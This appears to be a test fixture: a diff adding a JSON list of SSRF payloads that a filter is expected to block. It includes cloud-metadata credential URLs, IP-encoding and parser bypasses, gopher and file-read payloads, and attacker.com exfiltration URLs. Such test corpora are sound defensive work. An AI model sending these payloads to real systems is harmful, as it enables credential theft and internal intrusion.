@@ -1,0 +1,999 @@
+[
+  {
+      "id": "SSRF-CLOUD-001",
+      "payload": "http://169.254.169.254/latest/meta-data/",
+      "tags": [
+        "aws",
+        "imds",
+        "v1",
+        "quick",
+        "critical"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "AWS IMDSv1 root endpoint",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-002",
+      "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+      "tags": [
+        "aws",
+        "imds",
+        "v1",
+        "credentials",
+        "quick"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "AWS IMDSv1 IAM credentials endpoint",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-003",
+      "payload": "http://169.254.169.254/latest/user-data",
+      "tags": [
+        "aws",
+        "imds",
+        "v1",
+        "userdata"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "AWS IMDSv1 user-data (often contains secrets)",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-004",
+      "payload": "http://169.254.169.254/latest/dynamic/instance-identity/document",
+      "tags": [
+        "aws",
+        "imds",
+        "v1",
+        "identity"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "AWS instance identity document",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-005",
+      "payload": "http://169.254.169.254/latest/api/token",
+      "tags": [
+        "aws",
+        "imds",
+        "v2",
+        "token",
+        "quick"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "AWS IMDSv2 session token endpoint",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-006",
+      "payload": "http://169.254.169.254/latest/meta-data/placement/availability-zone",
+      "tags": [
+        "aws",
+        "imds",
+        "v1",
+        "metadata"
+    ],
+      "expected_block": true,
+      "severity_hint": "Medium",
+      "notes": "AWS availability zone metadata",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-007",
+      "payload": "http://metadata.google.internal/computeMetadata/v1/",
+      "tags": [
+        "gcp",
+        "metadata",
+        "quick"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "GCP metadata root endpoint",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-008",
+      "payload": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+      "tags": [
+        "gcp",
+        "metadata",
+        "credentials",
+        "quick"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "GCP service account OAuth token",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-009",
+      "payload": "http://metadata/computeMetadata/v1/instance/attributes/",
+      "tags": [
+        "gcp",
+        "metadata",
+        "short-hostname"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "GCP metadata via short hostname",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-010",
+      "payload": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+      "tags": [
+        "azure",
+        "imds",
+        "quick"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Azure IMDS instance metadata",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-011",
+      "payload": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/",
+      "tags": [
+        "azure",
+        "imds",
+        "credentials",
+        "quick"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Azure managed identity OAuth token",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-012",
+      "payload": "http://169.254.169.254/metadata/attested/document?api-version=2021-02-01",
+      "tags": [
+        "azure",
+        "imds",
+        "attestation"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Azure attested data document",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-013",
+      "payload": "http://100.100.100.200/latest/meta-data/",
+      "tags": [
+        "alibaba",
+        "metadata",
+        "quick"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Alibaba Cloud metadata service",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-014",
+      "payload": "http://100.100.100.200/latest/meta-data/ram/security-credentials/",
+      "tags": [
+        "alibaba",
+        "metadata",
+        "credentials"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Alibaba Cloud RAM credentials",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-015",
+      "payload": "http://169.254.169.254/metadata/v1.json",
+      "tags": [
+        "digitalocean",
+        "metadata",
+        "quick"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "DigitalOcean metadata service",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-016",
+      "payload": "http://169.254.169.254/metadata/v1/interfaces/public/0/ipv4/address",
+      "tags": [
+        "digitalocean",
+        "metadata"
+    ],
+      "expected_block": true,
+      "severity_hint": "Medium",
+      "notes": "DigitalOcean public IP metadata",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-017",
+      "payload": "http://169.254.169.254/openstack/latest/meta_data.json",
+      "tags": [
+        "openstack",
+        "metadata"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "OpenStack metadata service",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-018",
+      "payload": "http://fd00:ec2::254/latest/meta-data/",
+      "tags": [
+        "aws",
+        "imds",
+        "ipv6",
+        "quick"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "AWS IMDSv1 via IPv6 link-local",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-019",
+      "payload": "http://[fd00:ec2::254]/latest/meta-data/iam/security-credentials/",
+      "tags": [
+        "aws",
+        "imds",
+        "ipv6",
+        "credentials"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "AWS IMDSv1 IAM credentials via IPv6",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-020",
+      "payload": "http://169.254.169.254/2009-04-04/meta-data/",
+      "tags": [
+        "aws",
+        "imds",
+        "v1",
+        "legacy-version"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "AWS IMDS legacy API version",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-021",
+      "payload": "http://instance-data/latest/meta-data/",
+      "tags": [
+        "aws",
+        "imds",
+        "dns-alias"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "AWS IMDS via instance-data DNS alias",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-022",
+      "payload": "http://metadata.google.internal/computeMetadata/v1beta1/",
+      "tags": [
+        "gcp",
+        "metadata",
+        "beta"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "GCP metadata beta API version",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-023",
+      "payload": "http://metadata.google.internal/computeMetadata/v1/project/project-id",
+      "tags": [
+        "gcp",
+        "metadata",
+        "project"
+    ],
+      "expected_block": true,
+      "severity_hint": "Medium",
+      "notes": "GCP project ID metadata",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-024",
+      "payload": "http://169.254.169.254/metadata/instance/compute/azEnvironment?api-version=2021-02-01&format=text",
+      "tags": [
+        "azure",
+        "imds",
+        "environment"
+    ],
+      "expected_block": true,
+      "severity_hint": "Medium",
+      "notes": "Azure environment metadata",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-025",
+      "payload": "http://100.100.100.200/latest/dynamic/instance-identity/document",
+      "tags": [
+        "alibaba",
+        "metadata",
+        "identity"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Alibaba Cloud instance identity",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-026",
+      "payload": "http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key",
+      "tags": [
+        "aws",
+        "imds",
+        "v1",
+        "ssh-keys"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "AWS SSH public keys",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-027",
+      "payload": "http://169.254.169.254/latest/meta-data/network/interfaces/macs/",
+      "tags": [
+        "aws",
+        "imds",
+        "v1",
+        "network"
+    ],
+      "expected_block": true,
+      "severity_hint": "Medium",
+      "notes": "AWS network interfaces metadata",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-028",
+      "payload": "http://metadata.google.internal/computeMetadata/v1/instance/hostname",
+      "tags": [
+        "gcp",
+        "metadata",
+        "hostname"
+    ],
+      "expected_block": true,
+      "severity_hint": "Low",
+      "notes": "GCP instance hostname",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-029",
+      "payload": "http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/privateIpAddress?api-version=2021-02-01&format=text",
+      "tags": [
+        "azure",
+        "imds",
+        "network"
+    ],
+      "expected_block": true,
+      "severity_hint": "Low",
+      "notes": "Azure private IP address",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-030",
+      "payload": "http://169.254.169.254/metadata/v1/user-data",
+      "tags": [
+        "digitalocean",
+        "metadata",
+        "userdata"
+    ],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "DigitalOcean user-data",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-031",
+      "payload": "http://169.254.169.254/latest/meta-data/events/maintenance/scheduled",
+      "tags": [
+        "aws",
+        "imds",
+        "v1",
+        "events"
+    ],
+      "expected_block": true,
+      "severity_hint": "Low",
+      "notes": "AWS scheduled maintenance events",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-032",
+      "payload": "http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env",
+      "tags": [
+        "gcp",
+        "metadata",
+        "kubernetes"
+    ],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "GKE kube-env with cluster credentials",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-033",
+      "payload": "http://169.254.169.254/metadata/scheduledevents?api-version=2020-07-01",
+      "tags": [
+        "azure",
+        "imds",
+        "events"
+    ],
+      "expected_block": true,
+      "severity_hint": "Low",
+      "notes": "Azure scheduled events",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-034",
+      "payload": "http://100.100.100.200/latest/meta-data/instance-id",
+      "tags": [
+        "alibaba",
+        "metadata",
+        "instance"
+    ],
+      "expected_block": true,
+      "severity_hint": "Low",
+      "notes": "Alibaba Cloud instance ID",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-035",
+      "payload": "http://425.510.425.510/latest/meta-data/",
+      "tags": ["aws", "bypass", "overflow", "encoding"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "AWS metadata - dotted decimal with overflow",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-036",
+      "payload": "http://2852039166/latest/meta-data/",
+      "tags": ["aws", "bypass", "decimal", "encoding"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "AWS metadata - dotless decimal (169.254.169.254)",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-037",
+      "payload": "http://7147006462/latest/meta-data/",
+      "tags": ["aws", "bypass", "overflow", "encoding"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "AWS metadata - dotless decimal with overflow",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-038",
+      "payload": "http://0xA9.0xFE.0xA9.0xFE/latest/meta-data/",
+      "tags": ["aws", "bypass", "hex", "encoding"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "AWS metadata - dotted hexadecimal",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-039",
+      "payload": "http://0xA9FEA9FE/latest/meta-data/",
+      "tags": ["aws", "bypass", "hex", "encoding"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "AWS metadata - dotless hexadecimal",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-040",
+      "payload": "http://0x41414141A9FEA9FE/latest/meta-data/",
+      "tags": ["aws", "bypass", "hex", "overflow"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "AWS metadata - dotless hexadecimal with overflow",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-041",
+      "payload": "http://0251.0376.0251.0376/latest/meta-data/",
+      "tags": ["aws", "bypass", "octal", "encoding"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "AWS metadata - dotted octal",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-042",
+      "payload": "http://0251.00376.000251.0000376/latest/meta-data/",
+      "tags": ["aws", "bypass", "octal", "padding"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "AWS metadata - dotted octal with padding",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-043",
+      "payload": "http://0251.254.169.254/latest/meta-data/",
+      "tags": ["aws", "bypass", "mixed", "encoding"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "AWS metadata - mixed encoding (octal + decimal)",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-044",
+      "payload": "http://[::ffff:a9fe:a9fe]/latest/meta-data/",
+      "tags": ["aws", "bypass", "ipv6", "encoding"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "AWS metadata - IPv6 compressed",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-045",
+      "payload": "http://[0:0:0:0:0:ffff:a9fe:a9fe]/latest/meta-data/",
+      "tags": ["aws", "bypass", "ipv6", "encoding"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "AWS metadata - IPv6 expanded",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-046",
+      "payload": "http://[0:0:0:0:0:ffff:169.254.169.254]/latest/meta-data/",
+      "tags": ["aws", "bypass", "ipv6", "mixed"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "AWS metadata - IPv6/IPv4 mixed",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-047",
+      "payload": "http://[fd00:ec2::254]/latest/meta-data/",
+      "tags": ["aws", "bypass", "ipv6", "ec2"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "AWS metadata - IPv6 EC2 format",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-048",
+      "payload": "http://instance-data/latest/meta-data/",
+      "tags": ["aws", "bypass", "dns", "hostname"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "AWS metadata - instance-data hostname",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-049",
+      "payload": "http://169.254.169.254.nip.io/latest/meta-data/",
+      "tags": ["aws", "bypass", "dns", "rebinding"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "AWS metadata - nip.io DNS rebinding",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-050",
+      "payload": "http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key",
+      "tags": ["aws", "imds", "ssh", "keys"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "AWS SSH public key extraction",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-051",
+      "payload": "http://169.254.170.2/v2/credentials/",
+      "tags": ["aws", "ecs", "credentials"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "AWS ECS container credentials",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-052",
+      "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role",
+      "tags": ["aws", "beanstalk", "credentials"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "AWS Elastic Beanstalk EC2 role credentials",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-053",
+      "payload": "http://localhost:9001/2018-06-01/runtime/invocation/next",
+      "tags": ["aws", "lambda", "runtime"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "AWS Lambda runtime API",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-054",
+      "payload": "http://metadata.google.internal/computeMetadata/v1beta1/",
+      "tags": ["gcp", "metadata", "v1beta1"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "GCP metadata v1beta1 (no header required)",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-055",
+      "payload": "http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true",
+      "tags": ["gcp", "metadata", "recursive"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "GCP metadata v1beta1 recursive dump",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-056",
+      "payload": "http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token",
+      "tags": ["gcp", "metadata", "token"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "GCP access token extraction",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-057",
+      "payload": "http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json",
+      "tags": ["gcp", "metadata", "ssh"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "GCP SSH keys extraction",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-058",
+      "payload": "http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json",
+      "tags": ["gcp", "kubernetes", "credentials"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "GCP Kubernetes credentials",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-059",
+      "payload": "http://metadata/computeMetadata/v1/",
+      "tags": ["gcp", "metadata", "short"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "GCP metadata short hostname",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-060",
+      "payload": "http://169.254.169.254/metadata/v1.json",
+      "tags": ["digitalocean", "metadata", "json"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "DigitalOcean metadata JSON dump",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-061",
+      "payload": "http://169.254.169.254/metadata/v1/user-data",
+      "tags": ["digitalocean", "metadata", "userdata"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "DigitalOcean user-data",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-062",
+      "payload": "http://192.0.0.192/latest/meta-data/",
+      "tags": ["oracle", "metadata"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Oracle Cloud metadata endpoint",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-063",
+      "payload": "http://192.0.0.192/latest/user-data/",
+      "tags": ["oracle", "metadata", "userdata"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Oracle Cloud user-data",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-064",
+      "payload": "http://169.254.169.254/hetzner/v1/metadata",
+      "tags": ["hetzner", "metadata"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Hetzner Cloud metadata",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-065",
+      "payload": "http://169.254.169.254/hetzner/v1/metadata/private-networks",
+      "tags": ["hetzner", "metadata", "network"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Hetzner private network info",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-066",
+      "payload": "http://127.0.0.1:2379/v2/keys/?recursive=true",
+      "tags": ["kubernetes", "etcd", "keys"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Kubernetes ETCD keys dump",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-067",
+      "payload": "http://127.0.0.1:2379/version",
+      "tags": ["kubernetes", "etcd", "version"],
+      "expected_block": true,
+      "severity_hint": "Medium",
+      "notes": "Kubernetes ETCD version",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-068",
+      "payload": "http://127.0.0.1:2375/v1.24/containers/json",
+      "tags": ["docker", "api", "containers"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Docker API container listing",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-069",
+      "payload": "http://127.0.0.1:2375/images/json",
+      "tags": ["docker", "api", "images"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Docker API images listing",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-070",
+      "payload": "http://rancher-metadata/latest/",
+      "tags": ["rancher", "metadata"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Rancher metadata service",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-071",
+      "payload": "http://169.254.169.254/openstack",
+      "tags": ["openstack", "metadata"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "OpenStack/RackSpace metadata",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-072",
+      "payload": "http://169.254.169.254/2009-04-04/meta-data/",
+      "tags": ["hp", "helion", "metadata"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "HP Helion metadata",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-073",
+      "payload": "jar:http://127.0.0.1!/",
+      "tags": ["java", "jar", "bypass"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "JAR scheme SSRF bypass",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-074",
+      "payload": "jar:https://127.0.0.1!/",
+      "tags": ["java", "jar", "bypass", "https"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "JAR scheme HTTPS SSRF bypass",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-075",
+      "payload": "http://test???test.com",
+      "tags": ["php", "filter_var", "bypass"],
+      "expected_block": true,
+      "severity_hint": "Medium",
+      "notes": "PHP filter_var bypass with question marks",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-076",
+      "payload": "0://evil.com:80;http://google.com:80/",
+      "tags": ["php", "filter_var", "bypass"],
+      "expected_block": true,
+      "severity_hint": "Medium",
+      "notes": "PHP filter_var bypass with zero scheme",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-077",
+      "payload": "http://127.1.1.1:80\\@127.2.2.2:80/",
+      "tags": ["parser", "confusion", "bypass"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "URL parser confusion bypass",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-078",
+      "payload": "http://127.1.1.1:80\\@@127.2.2.2:80/",
+      "tags": ["parser", "confusion", "bypass"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "URL parser double-@ confusion",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-079",
+      "payload": "http://127.1.1.1:80#\\@127.2.2.2:80/",
+      "tags": ["parser", "fragment", "bypass"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "URL parser fragment confusion",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-080",
+      "payload": "http:127.0.0.1/",
+      "tags": ["parser", "scheme", "bypass"],
+      "expected_block": true,
+      "severity_hint": "Medium",
+      "notes": "URL parser scheme confusion (missing slashes)",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-081",
+      "payload": "http://1.1.1.1 &@2.2.2.2# @3.3.3.3/",
+      "tags": ["parser", "multi", "bypass"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Multi-parser confusion attack",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-082",
+      "payload": "gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00",
+      "tags": ["gopher", "mysql", "protocol"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Gopher to MySQL exploitation",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-083",
+      "payload": "gopher://127.0.0.1:53/%2500%251d%25a9%25c1%2500%2520",
+      "tags": ["gopher", "dns", "protocol"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Gopher DNS AXFR exploitation",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-084",
+      "payload": "gopher://metadata.google.internal:80/xGET%20/computeMetadata/v1/",
+      "tags": ["gopher", "gcp", "bypass"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Gopher to GCP metadata with headers",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-085",
+      "payload": "https://307.r3dir.me/--to/?url=http://localhost",
+      "tags": ["redirect", "bypass", "307"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "307 redirect service bypass",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-086",
+      "payload": "https://62epax5fhvj3zzmzigyoe5ipkbn7fysllvges3a.302.r3dir.me",
+      "tags": ["redirect", "bypass", "302"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "302 redirect to AWS metadata",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-087",
+      "payload": "make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms",
+      "tags": ["dns", "rebinding", "1u.ms"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "DNS rebinding via 1u.ms service",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-088",
+      "payload": "file:///etc/passwd",
+      "tags": ["file", "lfi", "linux"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "File scheme to read local files",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-089",
+      "payload": "file://\\/\\/etc/passwd",
+      "tags": ["file", "lfi", "bypass"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "File scheme with backslash bypass",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-090",
+      "payload": "dict://127.0.0.1:11211/stat",
+      "tags": ["dict", "memcached", "protocol"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Dict protocol to memcached",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-091",
+      "payload": "sftp://attacker.com:22/",
+      "tags": ["sftp", "exfiltration"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "SFTP protocol exploitation",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-092",
+      "payload": "tftp://attacker.com:69/file",
+      "tags": ["tftp", "exfiltration"],
+      "expected_block": true,
+      "severity_hint": "Medium",
+      "notes": "TFTP protocol exploitation",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-093",
+      "payload": "ldap://127.0.0.1:389/",
+      "tags": ["ldap", "internal", "protocol"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "LDAP protocol internal access",
+      "category": "SSRF"
+  },
+  {
+      "id": "SSRF-CLOUD-094",
+      "payload": "netdoc:///etc/passwd",
+      "tags": ["netdoc", "java", "lfi"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "Java netdoc scheme for file read",
+      "category": "SSRF"
+  }
+]
